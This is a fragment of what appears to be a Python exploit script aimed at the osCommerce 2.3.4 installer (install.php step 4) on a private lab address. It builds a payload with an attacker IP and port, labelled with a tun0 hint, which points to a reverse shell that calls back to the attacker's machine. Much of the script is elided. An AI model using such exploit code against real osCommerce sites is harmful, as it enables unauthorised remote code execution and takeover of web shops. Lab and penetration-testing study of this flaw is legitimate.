...
base_url = "http://10.10.105.165:8080/oscommerce-2.3.4/catalog/"
target_url = "http://10.10.105.165:8080/oscommerce-2.3.4/catalog/install/install.php?step=4"
...
payload += '$ip = "10.9.5.234";' # use tun0 IP address
payload += '$port = "1234";'
